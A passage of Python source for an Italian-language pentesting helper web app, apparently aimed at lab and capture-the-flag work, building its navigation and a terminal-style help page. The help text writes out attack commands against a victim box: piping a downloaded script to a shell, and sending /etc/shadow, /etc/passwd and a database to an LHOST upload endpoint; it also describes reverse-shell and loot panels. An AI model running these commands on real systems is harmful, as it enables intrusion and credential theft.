    if not NOTES_ROOT.is_dir():
        return []
    return sorted((p.stem, p.stem.replace("-", " ").title()) for p in NOTES_ROOT.glob("*.md"))


def _discover_vulns() -> list[tuple[str, str]]:
    if not VULN_ROOT.is_dir():
        return []
    return sorted((p.stem, p.stem.upper()) for p in VULN_ROOT.glob("*.md"))


def _discover_tools() -> list[tuple[str, str]]:
    if not TOOL_ROOT.is_dir():
        return []
    results = []
    for p in sorted(TOOL_ROOT.iterdir(), key=lambda x: x.name.lower()):
        if p.is_dir() and not p.name.startswith(".") and not p.name.startswith("__"):
            help_f = p / "help.md"
            if not help_f.exists():
                help_f = p / "help.txt"
            if help_f.exists():
                results.append((p.name, p.name))
    return results


def _base_html(title: str, body: str, active: str = "") -> str:
    docs_keys = {"notes", "vuln", "tools"}
    server_keys = {"static", "delivery", "loot", "logs", "catch"}

    def _drop(label, items, active_key):
        is_active = active_key in {k for _, _, k in items}
        bcls = ' class="nav-drop-btn active"' if is_active else ' class="nav-drop-btn"'
        h = f'<div class="nav-drop"><span{bcls}>{label} ▾</span><div class="nav-drop-menu">'
        for href, lbl, key in items:
            acls = ' class="active"' if key == active_key else ""
            h += f'<a href="{href}"{acls}>{lbl}</a>'
        h += '</div></div>'
        return h

    home_cls = ' class="active"' if active == "home" else ""
    nav_html = f'<a href="/"{home_cls}>Home</a>'
    nav_html += _drop("Docs", [
        ("/notes/", "Notes", "notes"),
        ("/vuln/", "Vuln", "vuln"),
        ("/tools/", "Tools", "tools"),
    ], active)
    nav_html += _drop("Server", [
        ("/static/", "Payload", "static"),
        ("/delivery", "Delivery", "delivery"),
        ("/loot/", "Loot", "loot"),
        ("/catch", "Catch", "catch"),
        ("/logs", "Logs", "logs"),
    ], active)
    pet_cls = ' class="active"' if active == "pet" else ""
    nav_html += f'<a href="/pet"{pet_cls}>Pet</a>'
    burp_cls = ' class="active"' if active == "burp" else ""
    nav_html += f'<a href="/burp"{burp_cls}>BURP</a>'
    report_cls = ' class="active"' if active == "report" else ""
    nav_html += f'<a href="/report"{report_cls}>Report</a>'

    return f"""<!DOCTYPE html>
<html lang="it"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🦭</text></svg>">
<title>{html.escape(title)} — SeaLion_Web</title>
<link rel="stylesheet" href="{_CSS_HLJS}">
<style>{_CSS}</style>
<script src="{_JS_MARKED}"></script>
<script src="{_JS_HLJS}"></script>
</head><body>
<div class="topbar">
<div class="topbar-left">
<a href="/" class="logo"><span class="prompt">&gt;_</span> SeaLion_Web</a>
<nav>{nav_html}</nav>
</div>
<div class="topbar-right">
<span class="version-tag">v{_sl_version_hash()}</span>
<div class="search-box">
<input type="text" id="global-search" placeholder="Cerca..." autocomplete="off" spellcheck="false">
<div class="search-results" id="search-results"></div>
</div>
</div>
</div>
{body}
<script>
(function(){{
  const input=document.getElementById('global-search');
  const box=document.getElementById('search-results');
  let timer=null;
  function doSearch(){{
    const q=input.value.trim();
    if(q.length<2){{box.classList.remove('open');box.innerHTML='';return;}}
    fetch('/api/search?q='+encodeURIComponent(q))
    .then(r=>r.json()).then(data=>{{
      if(!data.results||!data.results.length){{
        box.innerHTML='<div class="sr-empty">Nessun risultato</div>';
        box.classList.add('open');return;
      }}
      const cats={{notes:'Notes',vuln:'Vuln',tools:'Tools'}};
      box.innerHTML=data.results.map(r=>{{
        const href=r.href+'?q='+encodeURIComponent(q);
        return `<a class="sr-item" href="${{href}}">` +
          `<span class="sr-tag">${{cats[r.section]||r.section}}</span>` +
          `<span class="sr-name">${{hl(r.name,q)}}</span>` +
          `<span class="sr-ctx">${{hl(r.context,q)}}</span></a>`;
      }}).join('');
      box.classList.add('open');
    }}).catch(()=>{{box.innerHTML='<div class="sr-empty">Errore</div>';box.classList.add('open');}});
  }}
  function esc(s){{const d=document.createElement('div');d.textContent=s;return d.innerHTML;}}
  function hl(text,q){{
    const e=esc(text),re=new RegExp('('+esc(q).replace(/[.*+?^${{}}()|[\\]\\\\]/g,'\\\\$&')+')','gi');
    return e.replace(re,'<mark>$1</mark>');
  }}
  input.addEventListener('input',()=>{{clearTimeout(timer);timer=setTimeout(doSearch,250);}});
  input.addEventListener('focus',()=>{{if(box.innerHTML)box.classList.add('open');}});
  document.addEventListener('click',e=>{{if(!e.target.closest('.search-box'))box.classList.remove('open');}});
  input.addEventListener('keydown',e=>{{
    if(e.key==='Escape'){{box.classList.remove('open');input.blur();}}
    if(e.key==='Enter'){{
      const first=box.querySelector('.sr-item');
      if(first)location.href=first.href;
      else if(input.value.trim().length>=2)location.href='/search?q='+encodeURIComponent(input.value.trim());
    }}
  }});
}})();
</script>
</body></html>"""


def _page_home() -> str:
    tips = _load_tips()
    tip = random.choice(tips)
    seal = html.escape(_load_seal_art())

    wag_frames = _load_wag_frames()
    wag_json = json.dumps(wag_frames)
    bark_frames = _load_bark_frames()
    bark1_json = json.dumps(bark_frames[0])
    bark2_json = json.dumps(bark_frames[1])

    n_notes = len(_discover_notes())
    n_vulns = len(_discover_vulns())
    n_tools = len(_discover_tools())
    n_static = len([f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith(".")]) if STATIC_ROOT.is_dir() else 0
    n_loot = len(_discover_loot())

    body = f"""
<div class="home-layout">
<div class="sidebar">
  <div class="info-box home-meta">
    <div class="label">Versione:</div>
    <div class="value">v{_sl_version_hash()}</div>
  </div>
  <div class="info-box home-meta">
    <div class="label">GitHub:</div>
    <a href="https://github.com/Starlix27/SeaLion">github.com/Starlix27/SeaLion</a>
  </div>
  <div class="info-box home-meta">
    <div class="label">Creatrice:</div>
    <a href="https://github.com/Starlix27">@Starlix27</a>
  </div>
  <div class="info-box home-nav home-docs">
    <div class="label">Docs:</div>
    <ul class="cat-list">
      <li><a href="/notes/">Notes</a><span class="cnt">{n_notes} guide</span></li>
      <li><a href="/vuln/">Vuln</a><span class="cnt">{n_vulns} protocolli</span></li>
      <li><a href="/tools/">Tools</a><span class="cnt">{n_tools} tool</span></li>
    </ul>
  </div>
  <div class="info-box home-nav home-server">
    <div class="label">Server:</div>
    <ul class="cat-list">
      <li><a href="/static/">Payload</a><span class="cnt">{n_static} file</span></li>
      <li><a href="/delivery">Delivery</a><span class="cnt">payload &amp; curl</span></li>
      <li><a href="/loot/">Loot</a><span class="cnt">{n_loot} file</span></li>
      <li><a href="/catch">Catch</a><span class="cnt">OOB listeners</span></li>
      <li><a href="/logs">Logs</a><span class="cnt">server logs</span></li>
    </ul>
  </div>
  <div class="info-box home-nav home-tools">
    <div class="label">Strumenti:</div>
    <ul class="cat-list">
      <li><a href="/pet">Pet</a><span class="cnt">sealion virtuale</span></li>
      <li><a href="/burp">BURP</a><span class="cnt">password profiler</span></li>
      <li><a href="/report">Report</a><span class="cnt">report di pentest</span></li>
    </ul>
  </div>
  <div class="info-box home-pet" id="pet-widget" style="display:none">
    <div class="label">SeaLion Pet:</div>
    <div id="pet-home-name" class="value" style="cursor:pointer;color:var(--accent)" title="Apri Pet Portal"></div>
    <div id="pet-home-bars" style="margin-top:6px"></div>
  </div>
</div>
<div class="main-area">
  <div class="seal-container">
    <div class="seal-scene">
      <pre class="seal-art">{seal}</pre>
      <div class="seal-bubble-wrap">
        <div class="seal-bubble">{html.escape(tip)}</div>
      </div>
    </div>
  </div>
  <div class="terminal-input">
    <div id="term-output"></div>
    <div class="suggestions" id="suggestions"></div>
    <div class="prompt-line">
      <span class="user">user@slweb</span>:<span class="path">~</span>$&nbsp;
      <input type="text" id="term-input" placeholder="help, notes, vuln, tools, payload..." autocomplete="off" spellcheck="false">
    </div>
  </div>
</div>
</div>
<script>
(function(){{
  const cats=[
    {{name:'notes',label:'Notes',cnt:'{n_notes} guide',href:'/notes/'}},
    {{name:'vuln',label:'Vuln',cnt:'{n_vulns} protocolli',href:'/vuln/'}},
    {{name:'tools',label:'Tools',cnt:'{n_tools} tool',href:'/tools/'}},
    {{name:'static',label:'Payload',cnt:'{n_static} file',href:'/static/'}},
    {{name:'payload',label:'Payload',cnt:'{n_static} file',href:'/static/'}},
    {{name:'loot',label:'Loot',cnt:'{n_loot} file',href:'/loot/'}},
    {{name:'delivery',label:'Delivery',cnt:'payload & curl',href:'/delivery'}},
    {{name:'catch',label:'Catch',cnt:'OOB listeners',href:'/catch'}},
    {{name:'logs',label:'Logs',cnt:'server logs',href:'/logs'}},
    {{name:'pet',label:'Pet',cnt:'sealion virtuale',href:'/pet'}},
    {{name:'minigame',label:'Minigame',cnt:'quiz pentesting',href:'/pet/minigame'}},
    {{name:'burp',label:'BURP',cnt:'password profiler',href:'/burp'}},
    {{name:'report',label:'Report',cnt:'report di pentest',href:'/report'}},
  ];
  const input=document.getElementById('term-input');
  const box=document.getElementById('suggestions');
  const out=document.getElementById('term-output');
  let sel=-1;
  const hist=[];let hpos=-1;

  const HELP=
    '<span class="t-head">SeaLion Web — Comandi disponibili</span>\\n\\n'+
    '  <span class="t-section">— Docs</span>\\n'+
    '  <span class="t-accent">notes</span>       <span class="t-line">Apri le guide di pentesting ({n_notes} disponibili)</span>\\n'+
    '              <span class="t-line">Argomenti: footprinting, shells, password cracking, SSH, ecc.</span>\\n'+
    '  <span class="t-accent">vuln</span>        <span class="t-line">Apri le cheatsheet per protocollo ({n_vulns} protocolli)</span>\\n'+
    '              <span class="t-line">Ogni scheda ha: descrizione, porte, vuln comuni, comandi enum</span>\\n'+
    '  <span class="t-accent">tools</span>       <span class="t-line">Documentazione e help dei tool installabili ({n_tools})</span>\\n'+
    '              <span class="t-line">Ogni tool ha guida d\\\'uso, opzioni principali ed esempi</span>\\n\\n'+
    '  <span class="t-section">— Server</span>\\n'+
    '  <span class="t-accent">payload</span>     <span class="t-line">File manager per payload ({n_static} file)</span>\\n'+
    '              <span class="t-line">Crea, importa, modifica e scarica file serviti su /static/</span>\\n'+
    '  <span class="t-accent">delivery</span>    <span class="t-line">Pannello comandi curl per post-exploitation</span>\\n'+
    '              <span class="t-line">Reverse shell, upgrade TTY, upload file — comandi pronti da copiare</span>\\n'+
    '  <span class="t-accent">loot</span>        <span class="t-line">File ricevuti dalla vulnbox ({n_loot} file)</span>\\n'+
    '              <span class="t-line">Visualizza, scarica ed elimina i file caricati via curl /upload</span>\\n'+
    '  <span class="t-accent">logs</span>        <span class="t-line">Log delle richieste HTTP ricevute dal server</span>\\n'+
    '  <span class="t-accent">tunnel</span>      <span class="t-line">Port forwarding via chisel per accedere a servizi interni</span>\\n'+
    '              <span class="t-line">Mappa porte del target nel browser locale (tunnel help)</span>\\n\\n'+
    '  <span class="t-section">— Strumenti</span>\\n'+
    '  <span class="t-accent">pet</span>         <span class="t-line">Pet Portal — nutri, gioca e cura il tuo sealion</span>\\n'+
    '              <span class="t-line">Feed, play, spin, annoy + mini-games (blackjack, wordle, 8ball)</span>\\n'+
    '  <span class="t-accent">minigame</span>    <span class="t-line">Quiz fullscreen con 500 domande di pentesting</span>\\n'+
    '  <span class="t-accent">burp</span>        <span class="t-line">BURP — Profiler password avanzato (sostituisce CUPP)</span>\\n'+
    '  <span class="t-accent">report</span>      <span class="t-line">Report di penetration test — crea, anteprima e PDF dal template</span>\\n\\n'+
    '  <span class="t-section">— Wordlists</span>\\n'+
    '  <span class="t-accent">wordfind</span>    <span class="t-line">Wizard wordlist — suggerisce liste e comandi per fuzzing/brute-force</span>\\n'+
    '  <span class="t-accent">wordgen</span>     <span class="t-line">Wizard creazione wordlist personalizzate (cewl, crunch, ecc.)</span>\\n'+
    '  <span class="t-accent">passfind</span>    <span class="t-line">Wizard password cracking — hash, file protetti, archivi, servizi</span>\\n\\n'+
    '  <span class="t-section">— Terminale</span>\\n'+
    '  <span class="t-accent">help</span>        <span class="t-line">Mostra questo messaggio</span>\\n'+
    '  <span class="t-accent">help</span> <span class="t-line">&lt;cmd&gt;</span>  <span class="t-line">Dettagli su un comando (es. <span class="t-accent">help loot</span>)</span>\\n'+
    '  <span class="t-accent">version</span>     <span class="t-line">Versione SLConsole</span>\\n'+
    '  <span class="t-accent">clear</span>       <span class="t-line">Pulisci il terminale</span>\\n';

  const CMD_HELP={{
    notes:
      '<span class="t-head">notes — Guide di Pentesting</span>\\n\\n'+
      '<span class="t-line">Apre la sezione con {n_notes} guide scritte su argomenti di pentesting.</span>\\n'+
      '<span class="t-line">Ogni guida copre metodologia, comandi utili e tool consigliati.</span>\\n\\n'+
      '<span class="t-line">Argomenti disponibili: footprinting, info gathering, shells,</span>\\n'+
      '<span class="t-line">password cracking, SSH, Impacket, network services, PowerShell.</span>\\n\\n'+
      '<span class="t-line">Digitando <span class="t-accent">notes</span> verrai portato alla pagina delle guide.</span>',
    vuln:
      '<span class="t-head">vuln — Cheatsheet Protocolli</span>\\n\\n'+
      '<span class="t-line">Apre la sezione con {n_vulns} cheatsheet, una per protocollo di rete.</span>\\n'+
      '<span class="t-line">Ogni scheda include:</span>\\n'+
      '<span class="t-line">  • Descrizione del servizio e porte standard</span>\\n'+
      '<span class="t-line">  • Vulnerabilità comuni e vettori d\\\'attacco</span>\\n'+
      '<span class="t-line">  • Comandi di enumerazione pronti da usare</span>\\n'+
      '<span class="t-line">  • Tool consigliati per quel protocollo</span>\\n\\n'+
      '<span class="t-line">Protocolli: FTP, SSH, SMTP, SMB, DNS, RDP, MySQL, MSSQL, NFS,</span>\\n'+
      '<span class="t-line">SNMP, IPMI, IMAP/POP3, WinRM, WMI, Oracle TNS.</span>\\n\\n'+
      '<span class="t-line">Digitando <span class="t-accent">vuln</span> verrai portato alla pagina delle cheatsheet.</span>',
    tools:
      '<span class="t-head">tools — Documentazione Tool</span>\\n\\n'+
      '<span class="t-line">Apre la sezione con {n_tools} tool di sicurezza documentati.</span>\\n'+
      '<span class="t-line">Per ogni tool trovi: descrizione, opzioni principali, esempi d\\\'uso</span>\\n'+
      '<span class="t-line">e casi d\\\'uso comuni durante un engagement.</span>\\n\\n'+
      '<span class="t-line">Categorie: recon, OSINT, fuzzing, enum, brute-force, exploit,</span>\\n'+
      '<span class="t-line">post-exploitation, password cracking, wordlist.</span>\\n\\n'+
      '<span class="t-line">Digitando <span class="t-accent">tools</span> verrai portato alla pagina dei tool.</span>',
    static:
      '<span class="t-head">payload — File Manager Payload</span>\\n\\n'+
      '<span class="t-line">Apre il file manager per i payload in <code>static/</code>.</span>\\n'+
      '<span class="t-line">Da qui puoi creare, importare, modificare ed eliminare file</span>\\n'+
      '<span class="t-line">che il server serve su <code>/static/&lt;nome&gt;</code>.</span>\\n\\n'+
      '<span class="t-line">I file precaricati includono linseal, linpeas, linenum,</span>\\n'+
      '<span class="t-line">linux-exploit-suggester e pspy.</span>\\n\\n'+
      '<span class="t-line">Il target può scaricarli con:</span>\\n'+
      '<span class="t-accent">  curl http://LHOST:2727/static/linseal.sh | sh</span>\\n'+
      '<span class="t-accent">  curl http://LHOST:2727/static/linpeas.sh | bash</span>\\n\\n'+
      '<span class="t-line">Digitando <span class="t-accent">static</span> verrai portato al file manager.</span>',
    payload:
      '<span class="t-head">payload — File Manager Payload</span>\\n\\n'+
      '<span class="t-line">Apre il file manager per i payload in <code>static/</code>.</span>\\n'+
      '<span class="t-line">Da qui puoi creare, importare, modificare ed eliminare file</span>\\n'+
      '<span class="t-line">che il server serve su <code>/static/&lt;nome&gt;</code>.</span>\\n\\n'+
      '<span class="t-line">I file precaricati includono linseal, linpeas, linenum,</span>\\n'+
      '<span class="t-line">linux-exploit-suggester e pspy.</span>\\n\\n'+
      '<span class="t-line">Il target può scaricarli con:</span>\\n'+
      '<span class="t-accent">  curl http://LHOST:2727/static/linseal.sh | sh</span>\\n'+
      '<span class="t-accent">  curl http://LHOST:2727/static/linpeas.sh | bash</span>\\n\\n'+
      '<span class="t-line">Digitando <span class="t-accent">static</span> verrai portato al file manager.</span>',
    loot:
      '<span class="t-head">loot — File dalla Vulnbox</span>\\n\\n'+
      '<span class="t-line">Apre la sezione con i file caricati dalla vulnbox ({n_loot} presenti).</span>\\n'+
      '<span class="t-line">Da qui puoi visualizzare, scaricare ed eliminare ogni file.</span>\\n\\n'+
      '<span class="t-line">Come caricare file dalla macchina vittima:</span>\\n'+
      '<span class="t-accent">  curl -F \\"file=@/etc/passwd\\" http://LHOST:2727/upload</span>\\n'+
      '<span class="t-accent">  cat /etc/shadow | curl -X POST -d @- http://LHOST:2727/upload/shadow.txt</span>\\n'+
      '<span class="t-accent">  curl -T /tmp/db.sqlite http://LHOST:2727/upload/db.sqlite</span>\\n\\n'+
      '<span class="t-line">I file vengono salvati in <code>loot/</code> con il formato:</span>\\n'+
      '<span class="t-line">  <code>&lt;IP&gt;_&lt;DATA&gt;_&lt;ORA&gt;_&lt;NOME&gt;</code></span>\\n\\n'+
      '<span class="t-line">Digitando <span class="t-accent">loot</span> verrai portato alla pagina loot.</span>',
    delivery:
      '<span class="t-head">delivery — Comandi Curl per Post-Exploitation</span>\\n\\n'+
      '<span class="t-line">Apre il pannello con comandi curl pronti da copiare e incollare</span>\\n'+
      '<span class="t-line">sulla macchina vittima durante la post-exploitation.</span>\\n\\n'+
      '<span class="t-line">Sezioni disponibili:</span>\\n'+
      '<span class="t-line">  • <span class="t-accent">/upgrade</span>  — Upgrade shell instabile a TTY interattiva (socat/python pty)</span>\\n'+
      '<span class="t-line">  • <span class="t-accent">/upgrade2</span> — Upgrade in-place senza nuova connessione (8 metodi)</span>\\n'+
      '<span class="t-line">  • <span class="t-accent">/rev</span>      — Reverse shell Bash</span>\\n'+
      '<span class="t-line">  • <span class="t-accent">/sh</span>       — Reverse shell Python</span>\\n'+
      '<span class="t-line">  • <span class="t-accent">/upload</span>   — Upload file dalla vittima</span>\\n\\n'+
      '<span class="t-line">Ogni comando mostra LHOST e LPORT già configurati.</span>\\n\\n'+
      '<span class="t-line">Digitando <span class="t-accent">delivery</span> verrai portato al pannello.</span>',
    logs:
      '<span class="t-head">logs — Log del Server</span>\\n\\n'+
      '<span class="t-line">Apre la pagina con i log delle richieste HTTP ricevute.</span>\\n'+
      '<span class="t-line">Utile per verificare che il target stia effettivamente</span>\\n'+
      '<span class="t-line">scaricando i payload o caricando file.</span>\\n\\n'+
      '<span class="t-line">Digitando <span class="t-accent">logs</span> verrai portato alla pagina dei log.</span>',
    tunnel:
      '<span class="t-head">tunnel — Port Forwarding via chisel</span>\\n\\n'+
      '<span class="t-line">Crea un tunnel per accedere a servizi interni del target</span>\\n'+
      '<span class="t-line">(webapp su localhost, admin panel, ecc.) nel tuo browser.</span>\\n\\n'+
      '<span class="t-line">Comandi:</span>\\n'+
      '<span class="t-accent">  tunnel on &lt;porta&gt;</span>    <span class="t-line">Avvia tunnel per porta remota</span>\\n'+
      '<span class="t-accent">  tunnel off</span>          <span class="t-line">Chiudi tutti i tunnel</span>\\n'+
      '<span class="t-accent">  tunnel status</span>       <span class="t-line">Stato del server chisel</span>\\n'+
      '<span class="t-accent">  tunnel list</span>         <span class="t-line">Elenca tunnel attivi</span>\\n'+
      '<span class="t-accent">  tunnel fetch</span>        <span class="t-line">Scarica chisel in static/</span>\\n\\n'+
      '<span class="t-line">Esempio:</span>\\n'+
      '<span class="t-accent">  tunnel on 80</span> <span class="t-line">→ apri http://localhost:9000 nel browser</span>\\n\\n'+
      '<span class="t-line">Opzioni: <span class="t-accent">--local-port</span> (default 9000), <span class="t-accent">--server-port</span> (default 8443)</span>',
    burp:
      '<span class="t-head">burp — BURP Password Profiler</span>\\\\n\\\\n'+
      '<span class="t-line">Genera wordlist personalizzate basate sul profilo della vittima.</span>\\\\n'+
      '<span class="t-line">Compila il form con info su target, famiglia, animali, azienda e keyword.</span>\\\\n\\\\n'+
      '<span class="t-line">Livelli: <span class="t-accent">fast</span> (~2k), <span class="t-accent">medium</span> (~15k), <span class="t-accent">full</span> (~100k+)</span>\\\\n\\\\n'+
      '<span class="t-line">Digitando <span class="t-accent">burp</span> verrai portato al BURP profiler.</span>',
    report:
      '<span class="t-head">report — Report di Penetration Test</span>\\\\n\\\\n'+
      '<span class="t-line">Crea e gestisci report di pentest dal template SLCtrl (Markdown → PDF).</span>\\\\n'+
      '<span class="t-line">Da qui puoi creare un report, vederne l\\'anteprima e generare il PDF.</span>\\\\n\\\\n'+
      '<span class="t-line">In SLConsole:</span>\\\\n'+
      '<span class="t-accent">  report new "Cliente"</span>  <span class="t-line">Crea un nuovo report</span>\\\\n'+
      '<span class="t-accent">  report edit &lt;nome&gt;</span>  <span class="t-line">Lo apre in VS Code per editarlo</span>\\\\n'+
      '<span class="t-accent">  report build &lt;nome&gt;</span> <span class="t-line">Genera il PDF finale</span>\\\\n\\\\n'+
      '<span class="t-line">Digitando <span class="t-accent">report</span> verrai portato alla pagina Report.</span>',
    help:
      '<span class="t-head">help — Aiuto Comandi</span>\\n\\n'+
      '<span class="t-line">Mostra la lista dei comandi disponibili nel terminale SLWeb.</span>\\n\\n'+
      '<span class="t-line">Uso:</span>\\n'+
      '<span class="t-accent">  help</span>         <span class="t-line">Lista completa dei comandi</span>\\n'+
      '<span class="t-accent">  help &lt;cmd&gt;</span>   <span class="t-line">Dettagli su un comando specifico</span>\\n\\n'+
      '<span class="t-line">Esempio: <span class="t-accent">help loot</span>, <span class="t-accent">help delivery</span>, <span class="t-accent">help vuln</span></span>',
    clear:
      '<span class="t-head">clear — Pulisci Terminale</span>\\n\\n'+
      '<span class="t-line">Svuota l\\\'output del terminale. Non cancella la cronologia</span>\\n'+
      '<span class="t-line">dei comandi (puoi ancora usare ↑ ↓ per navigarla).</span>',
    version:
      '<span class="t-head">version — Versione</span>\\n\\n'+
      '<span class="t-line">Mostra la versione attuale di SeaLion Console.</span>',
    wordfind:
      '<span class="t-head">wordfind — Wizard Wordlist</span>\\n\\n'+
      '<span class="t-line">Wizard interattivo che suggerisce le wordlist più adatte</span>\\n'+
      '<span class="t-line">dal catalogo SecLists per il target specificato.</span>\\n\\n'+
      '<span class="t-line">Genera comandi pronti per:</span>\\n'+
      '<span class="t-line">  • <span class="t-accent">Fuzzing</span> — gobuster, ffuf, wfuzz, feroxbuster, dirsearch</span>\\n'+
      '<span class="t-line">  • <span class="t-accent">Brute-force</span> — hydra, medusa, ncrack, crackmapexec</span>\\n'+
      '<span class="t-line">  • <span class="t-accent">Parameter discovery</span> — arjun</span>\\n\\n'+
      '<span class="t-line">Uso nella console SLConsole:</span>\\n'+
      '<span class="t-accent">  wordfind http://target.htb</span>',
    wordgen:
      '<span class="t-head">wordgen — Wizard Creazione Wordlist</span>\\n\\n'+
      '<span class="t-line">Wizard interattivo per creare wordlist personalizzate</span>\\n'+
      '<span class="t-line">a partire da informazioni raccolte sul target.</span>\\n\\n'+
      '<span class="t-line">Metodi disponibili:</span>\\n'+
      '<span class="t-line">  • <span class="t-accent">cewl</span> — estrae parole da un sito web</span>\\n'+
      '<span class="t-line">  • <span class="t-accent">crunch</span> — genera combinazioni per pattern</span>\\n'+
      '<span class="t-line">  • <span class="t-accent">cupp</span> — profilo personale del target</span>\\n'+
      '<span class="t-line">  • <span class="t-accent">username-anarchy</span> — genera varianti di username</span>\\n\\n'+
      '<span class="t-line">Uso nella console SLConsole:</span>\\n'+
      '<span class="t-accent">  wordgen</span>',
    passfind:
      '<span class="t-head">passfind — Wizard Password Cracking</span>\\n\\n'+
      '<span class="t-line">Wizard interattivo per il cracking di password.</span>\\n'+
      '<span class="t-line">Guida passo-passo dalla scelta del tipo di hash/file</span>\\n'+
      '<span class="t-line">fino al comando finale pronto da eseguire.</span>\\n\\n'+
      '<span class="t-line">Categorie supportate:</span>\\n'+
      '<span class="t-line">  • <span class="t-accent">Hash</span> — MD5, SHA, NTLM, bcrypt, ecc. (john/hashcat)</span>\\n'+
      '<span class="t-line">  • <span class="t-accent">File protetti</span> — SSH key, PDF, Office, ZIP, KeePass</span>\\n'+
      '<span class="t-line">  • <span class="t-accent">Archivi/dischi</span> — BitLocker, TrueCrypt, LUKS</span>\\n'+
      '<span class="t-line">  • <span class="t-accent">Servizi di rete</span> — brute-force via hydra/medusa/ncrack</span>\\n\\n'+
      '<span class="t-line">Uso nella console SLConsole:</span>\\n'+
      '<span class="t-accent">  passfind</span>',
    pet:
      '<span class="t-head">pet — SeaLion Pet Portal</span>\\\\n\\\\n'+
      '<span class="t-line">Apre il portale del tuo sealion virtuale.</span>\\\\n'+
      '<span class="t-line">Nutrilo, gioca, fallo girare e tienilo felice!</span>\\\\n\\\\n'+
      '<span class="t-line">Funzioni: feed, play, spin, annoy, games (blackjack, wordle, guess, 8ball)</span>\\\\n'+
      '<span class="t-line">Stato sincronizzato con SLConsole (pet.json).</span>\\\\n\\\\n'+
      '<span class="t-line">Digitando <span class="t-accent">pet</span> verrai portato al Pet Portal.</span>',
    minigame:
      '<span class="t-head">minigame — Pentest Interview Quiz</span>\\\\n\\\\n'+
      '<span class="t-line">Apre il quiz fullscreen con 500 domande.</span>\\\\n'+
      '<span class="t-line">Configura categorie, livelli e quantità dal menu con i tre puntini.</span>',
  }};

  function echo(cmd,h){{
    out.innerHTML+=
      '<div class="t-entry"><span class="t-prompt">user@slweb</span>:<span class="t-accent">~</span>$ <span class="t-cmd">'+cmd+'</span></div>'+
      '<div class="t-entry">'+h+'</div>';
    out.scrollTop=out.scrollHeight;
  }}

  function run(raw){{
    const q=raw.trim();if(!q)return;
    hist.push(q);hpos=hist.length;
    const lo=q.toLowerCase();
    const parts=lo.split(' ').filter(Boolean);
    const nav=cats.find(c=>c.name===lo||c.label.toLowerCase()===lo);
    if(nav){{location.href=nav.href;return;}}
    if(parts[0]==='help'&&parts.length>1){{
      const sub=parts.slice(1).join(' ');
      const h=CMD_HELP[sub];
      if(h)echo(q,h);
      else echo(q,'<span class="t-line">Comando sconosciuto: <span class="t-accent">'+sub.replace(/</g,'&lt;')+'</span>. Scrivi <span class="t-accent">help</span> per la lista.</span>');
    }}
    else if(lo==='help'||lo==='?')echo(q,HELP);
    else if(lo==='clear')out.innerHTML='';
    else if(lo==='version')echo(q,'<span class="t-grn">SeaLion Console v{_sl_version_hash()}</span>');
    else if(CMD_HELP[lo])echo(q,CMD_HELP[lo]);
    else echo(q,'<span class="t-line">Comando sconosciuto: '+q.replace(/</g,'&lt;')+'. Scrivi <span class="t-accent">help</span> per la lista.</span>');
    input.value='';box.classList.remove('open');
  }}

  function render(filtered){{
    if(!filtered.length){{box.classList.remove('open');return;}}
    box.innerHTML=filtered.map((c,i)=>
      `<div class="sug${{i===sel?' active':''}}" data-href="${{c.href}}" data-name="${{c.name}}">` +
      `<span class="sug-name">${{c.label}}</span><span class="sug-cnt">${{c.cnt}}</span></div>`
    ).join('');
    box.classList.add('open');
    box.querySelectorAll('.sug').forEach(el=>{{
      el.addEventListener('click',()=>{{
        const hr=el.dataset.href;
        if(hr&&hr!=='null')location.href=hr;
        else{{input.value='';box.classList.remove('open');run(el.dataset.name);}}
      }});
      el.addEventListener('mouseenter',()=>{{sel=[...box.children].indexOf(el);render(filtered);}});
    }});
  }}

  const allNames=[...cats.map(c=>c.name),'tunnel','wordfind','wordgen','passfind','burp','help','clear','version'];
  const helpSubs=Object.keys(CMD_HELP);
  function filter(){{
    const q=input.value.trim().toLowerCase();
    sel=-1;
    if(!q){{render(cats);return;}}
    if(q.startsWith('help ')&&q.length>5){{
      const sub=q.slice(5);
      const matched=helpSubs.filter(n=>n.startsWith(sub)).map(n=>{{
        return {{name:'help '+n,label:'help '+n,cnt:'Dettagli comando',href:null}};
      }});
      render(matched);return;
    }}
    const merged=allNames.filter(n=>n.startsWith(q)).map(n=>{{
      const c=cats.find(x=>x.name===n);if(c)return c;
      const lb={{help:'Mostra comandi · help <cmd> per dettagli',clear:'Pulisci terminale',version:'Versione',tunnel:'Port forwarding via chisel',wordfind:'Wizard wordlist fuzzing/brute-force',wordgen:'Wizard creazione wordlist',passfind:'Wizard password cracking'}};
      return {{name:n,label:n.charAt(0).toUpperCase()+n.slice(1),cnt:lb[n]||'',href:null}};
    }});
    render(merged);
  }}

  input.addEventListener('input',filter);
  input.addEventListener('focus',filter);
  input.addEventListener('keydown',e=>{{
    const items=box.querySelectorAll('.sug');
    const open=box.classList.contains('open')&&items.length;
    if(e.key==='ArrowDown'&&open){{e.preventDefault();sel=Math.min(sel+1,items.length-1);filter();}}
    else if(e.key==='ArrowUp'&&open){{e.preventDefault();sel=Math.max(sel-1,-1);filter();}}
    else if(e.key==='ArrowUp'&&!open){{e.preventDefault();if(hpos>0){{hpos--;input.value=hist[hpos];}}}}
    else if(e.key==='ArrowDown'&&!open){{e.preventDefault();if(hpos<hist.length-1){{hpos++;input.value=hist[hpos];}}}}
    else if(e.key==='Tab'&&items.length){{e.preventDefault();const t=items[Math.max(sel,0)];input.value=t.dataset.name;filter();}}
    else if(e.key==='Enter'){{
      e.preventDefault();
      const active=open?items[Math.max(sel,0)]:null;
      if(active){{
        const hr=active.dataset.href;
        if(hr&&hr!=='null')location.href=hr;
        else run(active.dataset.name);
      }}else run(input.value);
    }}
  }});
  document.addEventListener('click',e=>{{if(!e.target.closest('.terminal-input'))box.classList.remove('open');}});
}})();
(function(){{
  var w=document.getElementById('pet-widget');
  if(!w)return;
  var bar=function(l,v){{
    var c=v>=60?'var(--green)':v>=30?'var(--yellow)':'var(--red)';
    return '<div style="display:flex;align-items:center;gap:6px;margin:2px 0">'+
      '<span style="color:var(--text2);width:55px;font-size:11px">'+l+'</span>'+
      '<div style="flex:1;height:6px;background:var(--border);border-radius:3px;overflow:hidden">'+
      '<div style="width:'+v+'%;height:100%;background:'+c+';border-radius:3px;transition:width .3s"></div>'+
